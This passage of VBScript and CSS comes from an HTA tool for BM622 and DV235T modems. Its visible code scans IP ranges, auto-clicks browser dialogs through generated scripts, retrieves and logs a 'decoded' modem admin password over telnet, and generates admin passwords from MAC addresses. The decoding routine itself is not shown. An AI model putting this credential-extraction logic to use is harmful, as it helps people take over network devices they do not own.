objOutputFile.WriteLine ("Set objStr = CreateObject("& chr(34) &"ADODB.Stream"& chr(34)&")")
objOutputFile.WriteLine "objStr.Open"
objOutputFile.WriteLine "objStr.Type     = 2"
objOutputFile.WriteLine "objStr.Position = 0"
objOutputFile.WriteLine "objStr.Charset  = "& chr(34) &"utf-8"& chr(34)&""
objOutputFile.WriteLine "objStr.WriteText "& chr(34) &textToStrm & chr(34) 
objOutputFile.WriteLine "objStr.SaveToFile "& chr(34) &fileToStream & chr(34) &", 2"
objOutputFile.WriteLine "objStr.Close"
objOutputFile.WriteLine "Set objStr = Nothing"
objOutputFile.WriteLine "WScript.Quit"	
objOutputFile.Close
End If
'CreateObject("WScript.Shell").Run "saveToStream.vbs" ,0 , True

CreateObject("WScript.Shell").Run textFilePath,0 , True
End Sub
Sub ClearSaveWebPage(saveWebPageToFileName)
'RestoreDefaultSettingsSnipe 
Const ForWriting = 2
filename = saveWebPageToFileName
saveWebPageToFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFSO = CreateObject("Scripting.FileSystemObject")
If (objFSO.FileExists(saveWebPageToFile)) Then
Set objOutputFile = objFSO.OpenTextFile(saveWebPageToFile, ForWriting)
objOutputFile.Close
End if
Set objFSO = Nothing
End Sub 'end ClearMacList
''
Sub updateRestoreDefaultFile(saveWebPageToFileName)
Const ForWriting = 2
filename = saveWebPageToFileName
saveWebPageToFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFSO = CreateObject("Scripting.FileSystemObject")
If (objFSO.FileExists(saveWebPageToFile)) Then
Set objOutputFile = objFSO.OpenTextFile(saveWebPageToFile, ForWriting)
objOutputFile.Write "No_Update:pulic101:PUBPLIC VERSION:yyyxyyyz:www.symbianize.com"
objOutputFile.Close
End if
Set objFSO = Nothing
End Sub
''
Function PingSite( myWebsite )
Dim intStatus, objHTTP
Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
objHTTP.Open "GET", "http://" & myWebsite & "/", False
objHTTP.SetRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MyApp 1.0; Windows NT 5.1)"
On Error Resume Next
objHTTP.Send
intStatus = objHTTP.Status
On Error Goto 0
If intStatus = 200 Then
PingSite = True
Else
PingSite = False
End If
Set objHTTP = Nothing
DisplayLogIpscan "Site status: " & PingSite
End Function
Function PingIpToScan(telHost)
result = False
Dim wmiQuery, objWMIService, objPing, objStatus
wmiQuery = "Select * From Win32_PingStatus Where Address = '" & telHost & "'"
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objPing = objWMIService.ExecQuery(wmiQuery)
For Each objStatus in objPing
If IsNull(objStatus.StatusCode) Or objStatus.Statuscode<>0 Then
result = False 
Else 
result = True 
End If
Next
Set wmiQuery = Nothing
Set objWMIService = Nothing 
Set objPing = Nothing 
Set objStatus  = Nothing
PingIpToScan = result 
End Function
Function PingIpToScanCMD(telHostScan)
Dim Shellx, strCommandx, ReturnCodex, resultx
Set Shellx = CreateObject("wscript.shell")
strCommandx = "%comspec% /c ping -n 1 -w 2000 " & telHostScan
resultx = False
ReturnCodex = 1 ''UNCOMMENT THIS
'While(True)
ReturnCodex = Shellx.Run(strCommandx, 0, True) 
If ReturnCodex = 0 Then
resultx = True
Else
resultx = False
End If
PingIpToScanCMD  = resultx
Set Shellx = Nothing
Set strCommandx = Nothing
End Function
Sub OnKeyUpDownInputIpStartAdd
If IsIpAddValid(Trim(InputStartIp.value)) Then
InputEndIp.value = IncIp(Trim(InputStartIp.value))
InputEndIp.style.background = "White"
InputEndIp.style.color = "#000000"
btnStartIpScan.Disabled = False
Else
InputEndIp.value = "Invalid Start IP"
btnStartIpScan.Disabled = True
End if
End Sub
Sub OnKeyUpDownInputIpEndAdd
If IsIpAddValid(Trim(InputEndIp.value)) Then
'InputEndIp.value = IncIp(Trim(InputEndIp.value))
InputEndIp.style.background = "White"
InputEndIp.style.color = "#000000"
btnStartIpScan.Disabled = False
Else
'MsgBox "Invalid End IP Address"
InputEndIp.style.color = "White"
InputEndIp.style.background = "Red"
btnStartIpScan.Disabled = True
End if
End Sub
Function IncIp(IPAddr) 
Dim Oct                ' Array of Octets 
Dim i 
Dim cf                ' Carry Flag 
Oct = Split(IpAddr,".",-1,vbTextCompare) 
cf = True 
For i = UBound(Oct) to 0 Step -1 
If cf then 
If Oct(i) >= 255 then 
Oct(i) = 1 
Else 
Oct(i) = Oct(i) + 1
cf = False 
End If     
End If  
Next 
IncIP = Oct(0) & "." & Oct(1) & "." & Oct(2) & "." & Oct(3) 
End Function 
Function IsIpAddValid (ipAdd)
strIpAdd = ipAdd 'Trim(InputStartIp.value)
Set objRE = New RegExp
With objRE
.Pattern    = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
' .IgnoreCase = True
.Global     = False
End With
' Test method returns TRUE if a match is found
If objRE.Test( strIpAdd ) Then
isValid = True
Else
isValid = False
End If
Set objRE = Nothing
IsIpAddValid = isValid
End Function
Sub DisplayLogIpscan(stringMessage)
'	Sleeper 100
LogLiveIp.Value = LogLiveIp.Value & vbCr & vbLf & stringMessage 
TextAreaScrollBottom (LogLiveIp.name)
End Sub 'end Readfile log file  
Sub WaitSeconds (intNumSecs) 
' Because WScript.Sleep () is not available in HTA 
' scripts, invoke a VBScript file to do the waiting. 
Dim strScriptFile, strCommand, intRetcode, objWS 
If intNumSecs <= 0 Then Exit Sub 
Set objWS = CreateObject ("WScript.Shell") 
strScriptFile = "%temp%\wait" & intNumSecs & "seconds.vbs" 
strCommand = "cmd /c ""echo WScript.Sleep " & intNumSecs * 1000 & " >" & strScriptFile & _ 
"&start /wait """" wscript.exe " & strScriptFile & """" 
intRetCode = objWS.Run (strCommand, 0, True) 
If intRetCode = 0 Then Exit Sub 
LogLine "ERROR " & CStr (intRetCode) & " DURING WAITSECONDS PROCEDURE" 
End Sub 'end WaitSeconds
Sub checkTimerWait
If (IsSnipeMac <> document.title)  Or (base64decode(scanId.value) <> document.title) Then
Self.close
End if
End Sub
Sub Sleeper(MSecs) 
filename = "sleeper.vbs"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If Fso.FileExists(currentFolderAndFile)=False Then
Set objOutputFile = fso.CreateTextFile(currentFolderAndFile, True)
objOutputFile.Writeline "wscript.sleep WScript.Arguments(0)"
objOutputFile.Writeline "WScript.Quit"
objOutputFile.Close
End If
''CreateObject("WScript.Shell").Run "sleeper.vbs " & MSecs,0 , True	
''CreateObject("WScript.Shell").Run textFilePath &" " & MSecs,0 , True	
''ExecuteSleeperVbs "wscript",filename,MSecs,"sleeperFile"
''DisplayLogIpscan "sleeper: " &MSecs &" " &currentFolderAndFile
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &MSecs,0 , True	
''ExecuteSleeperVbs MSecs,"sleeperFile"
''objShell.ShellExecute "wscript", Chr(34)& currentFolderAndFile & chr(34) &" " &sleepTimeSec, currentWorkingFolder, ""
End Sub 'end Sleeper
Sub pressOkOld
Set fso = CreateObject("Scripting.FileSystemObject")
If Fso.FileExists("pressOk.vbs")=False Then
Set objOutputFile = fso.CreateTextFile("pressOk.vbs", True)
objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
objOutputFile.WriteLine "WScript.Sleep 5000"
objOutputFile.WriteLine ("WshShell.SendKeys("& chr(34) &"{Enter}"& chr(34)&")")
objOutputFile.Close
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile("pressOk.vbs", ForWriting)
'objOutputFile.WriteLine ("MsgBox" & chr(34) &"send keys activating"& chr(34)&"")
objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
objOutputFile.WriteLine "WScript.Sleep 5000"
objOutputFile.WriteLine ("WshShell.SendKeys("& chr(34) &"{Enter}"& chr(34)&")")
'objOutputFile.WriteLine ("MsgBox" & chr(34) &"Send KEys Finish"& chr(34)&"")
objOutputFile.Close
End If
'CreateObject("WScript.Shell").Run "pressOk.vbs " & MSecs,0 , True
End Sub 'end Sleeper
Sub pressOk
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "pressOk.vbs"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If Fso.FileExists(textFilePath)=False Then
Set objOutputFile = fso.CreateTextFile(textFilePath, True)
objOutputFile.WriteLine "Option Explicit"
objOutputFile.WriteLine "Dim oShell,oAutoIt,WshShell,winIsExistIE6,countTest,winIsExistIE6Up,countTestIE6up"
objOutputFile.WriteLine ("Set oAutoIt = CreateObject("& chr(34) &"AutoItX3.Control"& chr(34)&")")
objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
objOutputFile.WriteLine "countTest = 0"
objOutputFile.WriteLine "countTestIE6up = 0"
objOutputFile.WriteLine "winIsExistIE6 = 0"
objOutputFile.WriteLine "winIsExistIE6Up = 0"
objOutputFile.WriteLine "WScript.Sleep 2500"
objOutputFile.WriteLine "Do"
objOutputFile.WriteLine "countTest = countTest + 1"
objOutputFile.WriteLine "countTestIE6up = countTestIE6up + 1"
'objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", ""Do you want to change current profile?"")"
'objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", ""Do you want to change current profile?"")"
objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", """")"
objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", """")"
objOutputFile.WriteLine "If countTest = 20 Then"
objOutputFile.WriteLine "winIsExistIE6 = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If countTestIE6up = 20 Then"
objOutputFile.WriteLine "winIsExistIE6Up = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6 = 1 Or winIsExistIE6Up = 1 Then"
objOutputFile.WriteLine "winIsExistIE6 = 1"
objOutputFile.WriteLine "winIsExistIE6Up = 1"
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "WScript.Sleep 5000"
objOutputFile.WriteLine "Loop While winIsExistIE6 = 0 OR winIsExistIE6Up = 0"
'objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", ""Do you want to change current profile?"")"
'objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", ""Do you want to change current profile?"")"
objOutputFile.WriteLine "If winIsExistIE6 > 0 Then"
'objOutputFile.WriteLine "oAutoIt.ControlSend ""Microsoft Internet Explorer"", ""Do you want to change current profile?"", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "oAutoIt.ControlSend ""Microsoft Internet Explorer"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6Up > 0 Then"
'objOutputFile.WriteLine "oAutoIt.ControlSend ""Message from webpage"", ""Do you want to change current profile?"", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "oAutoIt.ControlSend ""Message from webpage"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "Set oShell = Nothing"
objOutputFile.WriteLine "Set oAutoIt = Nothing"
objOutputFile.WriteLine "Set WshShell = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6 = Nothing"
objOutputFile.WriteLine "Set countTest = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6Up = Nothing"
objOutputFile.WriteLine "Set countTestIE6up = Nothing"
objOutputFile.WriteLine "WScript.Quit"
'objOutputFile.WriteLine "WScript.Sleep 5000" 
'objOutputFile.WriteLine ("WshShell.SendKeys("& chr(34) &"{Enter}"& chr(34)&")")
objOutputFile.Close
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(textFilePath, ForWriting)
objOutputFile.WriteLine "Option Explicit"
objOutputFile.WriteLine "Dim oShell,oAutoIt,WshShell,winIsExistIE6,countTest,winIsExistIE6Up,countTestIE6up"
objOutputFile.WriteLine ("Set oAutoIt = CreateObject("& chr(34) &"AutoItX3.Control"& chr(34)&")")
objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
objOutputFile.WriteLine "countTest = 0"
objOutputFile.WriteLine "countTestIE6up = 0"
objOutputFile.WriteLine "winIsExistIE6 = 0"
objOutputFile.WriteLine "winIsExistIE6Up = 0"
objOutputFile.WriteLine "WScript.Sleep 2500"
objOutputFile.WriteLine "Do"
objOutputFile.WriteLine "countTest = countTest + 1"
objOutputFile.WriteLine "countTestIE6up = countTestIE6up + 1"
'objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", ""Do you want to change current profile?"")"
'objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", ""Do you want to change current profile?"")"
objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", """")"
objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", """")"
objOutputFile.WriteLine "If countTest = 20 Then"
objOutputFile.WriteLine "winIsExistIE6 = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If countTestIE6up = 20 Then"
objOutputFile.WriteLine "winIsExistIE6Up = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6 = 1 Or winIsExistIE6Up = 1 Then"
objOutputFile.WriteLine "winIsExistIE6 = 1"
objOutputFile.WriteLine "winIsExistIE6Up = 1"
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "WScript.Sleep 5000"
objOutputFile.WriteLine "Loop While winIsExistIE6 = 0 OR winIsExistIE6Up = 0"
'objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", ""Do you want to change current profile?"")"
'objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", ""Do you want to change current profile?"")"
objOutputFile.WriteLine "If winIsExistIE6 > 0 Then"
'objOutputFile.WriteLine "oAutoIt.ControlSend ""Microsoft Internet Explorer"", ""Do you want to change current profile?"", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "oAutoIt.ControlSend ""Microsoft Internet Explorer"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6Up > 0 Then"
'objOutputFile.WriteLine "oAutoIt.ControlSend ""Message from webpage"", ""Do you want to change current profile?"", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "oAutoIt.ControlSend ""Message from webpage"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "Set oShell = Nothing"
objOutputFile.WriteLine "Set oAutoIt = Nothing"
objOutputFile.WriteLine "Set WshShell = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6 = Nothing"
objOutputFile.WriteLine "Set countTest = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6Up = Nothing"
objOutputFile.WriteLine "Set countTestIE6up = Nothing"
objOutputFile.WriteLine "WScript.Quit"		
objOutputFile.Close
End If
'CreateObject("WScript.Shell").Run "pressOk.vbs " & MSecs,0 , True
End Sub 'end pressOkNew
''pressOkFreq
Sub pressOkFreq
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "pressOkFreq.vbs"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If Fso.FileExists(textFilePath)=False Then
Set objOutputFile = fso.CreateTextFile(textFilePath, True)
objOutputFile.WriteLine "Option Explicit"
objOutputFile.WriteLine "Dim oShell,oAutoIt,WshShell,winIsExistIE6,countTest,winIsExistIE6Up,countTestIE6up"
objOutputFile.WriteLine ("Set oAutoIt = CreateObject("& chr(34) &"AutoItX3.Control"& chr(34)&")")
objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
objOutputFile.WriteLine "countTest = 0"
objOutputFile.WriteLine "countTestIE6up = 0"
objOutputFile.WriteLine "winIsExistIE6 = 0"
objOutputFile.WriteLine "winIsExistIE6Up = 0"
objOutputFile.WriteLine "WScript.Sleep 2500"
objOutputFile.WriteLine "Do"
objOutputFile.WriteLine "countTest = countTest + 1"
objOutputFile.WriteLine "countTestIE6up = countTestIE6up + 1"
objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", """")"
objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", """")"
objOutputFile.WriteLine "If countTest = 20 Then"
objOutputFile.WriteLine "winIsExistIE6 = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If countTestIE6up = 20 Then"
objOutputFile.WriteLine "winIsExistIE6Up = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6 = 1 Or winIsExistIE6Up = 1 Then"
objOutputFile.WriteLine "winIsExistIE6 = 1"
objOutputFile.WriteLine "winIsExistIE6Up = 1"
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "WScript.Sleep 5000"
objOutputFile.WriteLine "Loop While winIsExistIE6 = 0 OR winIsExistIE6Up = 0"
'objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", """")"
'objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", """")"
objOutputFile.WriteLine "If winIsExistIE6 > 0 Then"
objOutputFile.WriteLine "oAutoIt.ControlSend ""Microsoft Internet Explorer"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6Up > 0 Then"
objOutputFile.WriteLine "oAutoIt.ControlSend ""Message from webpage"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "Set oShell = Nothing"
objOutputFile.WriteLine "Set oAutoIt = Nothing"
objOutputFile.WriteLine "Set WshShell = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6 = Nothing"
objOutputFile.WriteLine "Set countTest = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6Up = Nothing"
objOutputFile.WriteLine "Set countTestIE6up = Nothing"
objOutputFile.WriteLine "WScript.Quit"
'objOutputFile.WriteLine "WScript.Sleep 5000" 
'objOutputFile.WriteLine ("WshShell.SendKeys("& chr(34) &"{Enter}"& chr(34)&")")
objOutputFile.Close
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(textFilePath, ForWriting)
objOutputFile.WriteLine "Option Explicit"
objOutputFile.WriteLine "Dim oShell,oAutoIt,WshShell,winIsExistIE6,countTest,winIsExistIE6Up,countTestIE6up"
objOutputFile.WriteLine ("Set oAutoIt = CreateObject("& chr(34) &"AutoItX3.Control"& chr(34)&")")
objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
objOutputFile.WriteLine "countTest = 0"
objOutputFile.WriteLine "countTestIE6up = 0"
objOutputFile.WriteLine "winIsExistIE6 = 0"
objOutputFile.WriteLine "winIsExistIE6Up = 0"
objOutputFile.WriteLine "WScript.Sleep 2500"
objOutputFile.WriteLine "Do"
objOutputFile.WriteLine "countTest = countTest + 1"
objOutputFile.WriteLine "countTestIE6up = countTestIE6up + 1"
objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", """")"
objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", """")"
objOutputFile.WriteLine "If countTest = 20 Then"
objOutputFile.WriteLine "winIsExistIE6 = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If countTestIE6up = 20 Then"
objOutputFile.WriteLine "winIsExistIE6Up = 0" 
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6 = 1 Or winIsExistIE6Up = 1 Then"
objOutputFile.WriteLine "winIsExistIE6 = 1"
objOutputFile.WriteLine "winIsExistIE6Up = 1"
objOutputFile.WriteLine "Exit Do"
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "WScript.Sleep 5000"
objOutputFile.WriteLine "Loop While winIsExistIE6 = 0 OR winIsExistIE6Up = 0"
'objOutputFile.WriteLine "winIsExistIE6 = oAutoIt.WinExists (""Microsoft Internet Explorer"", """")"
'objOutputFile.WriteLine "winIsExistIE6Up = oAutoIt.WinExists (""Message from webpage"", """")"
objOutputFile.WriteLine "If winIsExistIE6 > 0 Then"
objOutputFile.WriteLine "oAutoIt.ControlSend ""Microsoft Internet Explorer"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "If winIsExistIE6Up > 0 Then"
objOutputFile.WriteLine "oAutoIt.ControlSend ""Message from webpage"", """", ""[CLASS:Button;]"", ""{Enter}"""
objOutputFile.WriteLine "End If"
objOutputFile.WriteLine "Set oShell = Nothing"
objOutputFile.WriteLine "Set oAutoIt = Nothing"
objOutputFile.WriteLine "Set WshShell = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6 = Nothing"
objOutputFile.WriteLine "Set countTest = Nothing"
objOutputFile.WriteLine "Set winIsExistIE6Up = Nothing"
objOutputFile.WriteLine "Set countTestIE6up = Nothing"
objOutputFile.WriteLine "WScript.Quit"		
objOutputFile.Close
End If
'CreateObject("WScript.Shell").Run "pressOk.vbs " & MSecs,0 , True
End Sub 'end pressOkNew
''end presOkFreq
Function Get6222011PassOnly(viewLogNum)
'Begin Get 622 2011 pass
bm6222011AdminPass =""
DisplayLog viewLogNum, "Retrieving 622 2011 admin password... Please WAIT..."
ConnectToTST6222011GetPass(viewLogNum)
DisplayLog viewLogNum, "Checking extracted password result......"
Sleeper 1000
If GetBM6222011PassFromFile <> "NOT FOUND" Then	
bm6222011AdminPass = GetBM6222011PassFromFile
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLog viewLogNum, "DECODED Admin pass: " & bm6222011AdminPass
Else
ClearSaveWebPage("TelnetOutPutCmndGetPass.txt")
Sleeper 1000
ClearSaveWebPage("TelnetInputCmndGetPass.txt")
DisplayLog viewLogNum, "Cannot retrieve Admin Password......"
Exit Function
End If
'End Get 622 2011 pass
Get6222011PassOnly = bm6222011AdminPass
End Function
Sub GoToWebAdmin
''If radiobtnBm6222011.checked Then
If radiobtnBm6222011.checked Then
If radiobtnWebAdminCus.Checked And inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") Then
''copyToClipBoard(Trim(inputWebAdminPassowrd.value))
DisplayLog 1, "Copying CUSTOMIZE Password to clipboard finished......"
DisplayLog 1, "Use CTRL+V/PASTE to use the Password..."
Else
copyToClipBoard(Get6222011PassOnly(1))
DisplayLog 1, "Copying DECODED Password to clipboard finished......"
DisplayLog 1, "Use CTRL+V/PASTE to use the Password..."
End if 
Else
getmacPass = generatePassword(Trim(inputChangeMacOne.value))
copyToClipBoard(getmacPass)
DisplayLog 1, "Copying GENERATED Password to clipboard finished......"
DisplayLog 1, "Use CTRL+V/PASTE to use the Password..."
End If
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") then
''setPassword.Value = Trim(inputWebAdminPassowrd.value)
copyToClipBoard(Trim(inputWebAdminPassowrd.value))
End If 
End If
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
copyToClipBoard("NOT_YET_AVAILABLE")
End If 
DisplayLog 1, "Trying to access " & inputTelnetHost.value
CreateObject("WScript.Shell").Run("http://" & inputTelnetHost.value)
DisplayLog 1, "Process finished!....(Please WAIT! this may take a while...)" 
End Sub
Sub ALAST
End Sub
'===
</SCRIPT>
<style type="text/css">

body, td, th
{
font-family: Arial;
/*background-color: DarkGrey;*/
}
..head
{
font-size: 110%;
font-weight: bold;
}
..panel
{
display: none;
margin-top: -1px; /*background-color: #660000;*/
background-color: #660000;
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#660000', endColorstr='#B20000',GradientType=0);
border-style: solid solid solid solid;
border-color: black black black black;
border-width: 1px 1px 1px 1px;
height: 410px;
padding: 5px;
position: relative;
width: 100%;
z-index: 0;
}
..tabs
{
border-collapse: collapse;
color: black;
cursor: pointer;
cursor: hand;
font-family: arial;
font-size: 9pt;
font-weight: bold;
margin-top: 4px;
padding: 2px 4px 2px 4px;
position: relative;
text-align: center;
text-decoration: none;
z-index: 1;
}
..tabs0
{
background-color: LightGrey;
border: solid 1px black;
color: #660000;
}
..tabs1
{
background-color: #660000;
background-color: #660000;
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#FF0000', endColorstr='#660000',GradientType=0);
border-color: black;
text-decoration: underline;
color: white;
border-style: solid solid hidden solid;
border-width: 1px;
}
..nav
{
border-collapse: collapse;
align: center;
padding: 0;
spacing: 0;
width: 100%;
}
input.btn
{
color: #600;
font: bold 84% 'trebuchet ms' ,helvetica,sans-serif;
background-color: #fed;
border: 1px solid;
border-color: #600 #900 #900 #600;
filter: progid:DXImageTransform.Microsoft.Gradient (GradientType=0,StartColorStr= '#ffffffff' ,EndColorStr= '#ffeeddaa' );
height: 22px;
}
input.MenuBtn
{
color: #600;
font: bold 84% 'trebuchet ms' ,helvetica,sans-serif;
background-color: #fed;
border: 1px solid;
border-color: #600 #900 #900 #600;
filter: progid:DXImageTransform.Microsoft.Gradient (GradientType=0,StartColorStr= '#ffffffff' ,EndColorStr= '#ffeeddaa' );
height: 25px;
}
input.btnTable
{
color: #600;
font: bold 100% 'trebuchet ms' ,helvetica,sans-serif;
background-color: #fed;
border: 1px solid;
border-color: #600 #900 #900 #600;
filter: progid:DXImageTransform.Microsoft.Gradient (GradientType=0,StartColorStr= '#ffffffff' ,EndColorStr= '#ffeeddaa' );
height: 17px;
line-height: 14px;
}
.Content
{
height: 101px;
overflow: auto;
background: #fff;
width: 393px;
margin-left: 10px;
}
.ContentLive
{
height: 270px;
overflow: auto;
background: #fff;
width: 390px;
margin-left: 5px;
overflow: auto; /*white-space: nowrap;*/
}
.ContentLiveCrrntIpScan
{
height: 270px;
overflow: auto;
background: #fff;
width: 390px;
margin-left: 5px;
overflow: auto; /*white-space: nowrap;*/
}
.ContentIpScanLog
{
height: 185px;
width: 397px;
margin-left: 5px;
}
/*tablegenmac*/
table.gridtable
{
font-family: verdana,arial,sans-serif;
font-size: 10px;
color: #600;
border-width: 1px;
border-color: #900;
border-collapse: collapse;
width: 100%;
}
table.gridtable th
{
font-size: 12px;
font: bold 100% 'trebuchet ms' ,helvetica,sans-serif;
border-width: 1px;
padding: 2px;
border-style: solid; /*border-color: #900;*/
border-color: #600 #900 #900 #600;
background-color: #dedede;
filter: progid:DXImageTransform.Microsoft.Gradient (GradientType=0,StartColorStr= '#ffffffff' ,EndColorStr= '#ffeeddaa' );
}
table.gridtable td
{
border-width: 1px;
padding: 1px;
border-style: solid;
border-color: #900; /*background-color: #ffffff;*/
text-align: center;
}
/*end tablegenmac*/
/*tableLivemac*/
table.gridtableLive
{
font-family: verdana,arial,sans-serif;
font-size: 10px;
color: #600;
border-width: 1px;
border-color: #900;
border-collapse: collapse;
width: 620px;
overflow: auto;
}
table.gridtableLive th
{
font-size: 12px;
font: bold 100% 'trebuchet ms' ,helvetica,sans-serif;
border-width: 1px;
padding: 2px;
border-style: solid; /*border-color: #900;*/
border-color: #600 #900 #900 #600;
background-color: #dedede;
filter: progid:DXImageTransform.Microsoft.Gradient (GradientType=0,StartColorStr= '#ffffffff' ,EndColorStr= '#ffeeddaa' );
}
table.gridtableLive td
{
border-width: 1px;
padding: 1px;
padding-left: 5px;
border-style: solid;
border-color: #900; /*background-color: #ffffff;*/
text-align: left;
}
/*end tableLivemac*/
/*tableLiveCrnTIpScan*/
table.gridtableLiveCrnTIpScan
{
font-family: verdana,arial,sans-serif;
font-size: 10px;
color: #600;
border-width: 1px;
border-color: #900;
border-collapse: collapse;
width: 750px;
overflow: auto;
}
table.gridtableLiveCrnTIpScan th
{
font-size: 12px;
font: bold 100% 'trebuchet ms' ,helvetica,sans-serif;
border-width: 1px;
padding: 2px;
border-style: solid; /*border-color: #900;*/
border-color: #600 #900 #900 #600;
background-color: #dedede;
filter: progid:DXImageTransform.Microsoft.Gradient (GradientType=0,StartColorStr= '#ffffffff' ,EndColorStr= '#ffeeddaa' );
}
table.gridtableLiveCrnTIpScan td
{
border-width: 1px;
padding: 1px;
padding-left: 5px;
border-style: solid;
border-color: #900; /*background-color: #ffffff;*/
text-align: left;
}
/*end tableLivemacCrnTIpScan*/
</style>
<body onload="onLoad()" style="background-color:Transparent;background-color:#830300;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#000000', endColorstr='#660000',GradientType=0);">
<table class="nav">
<tr valign="top">
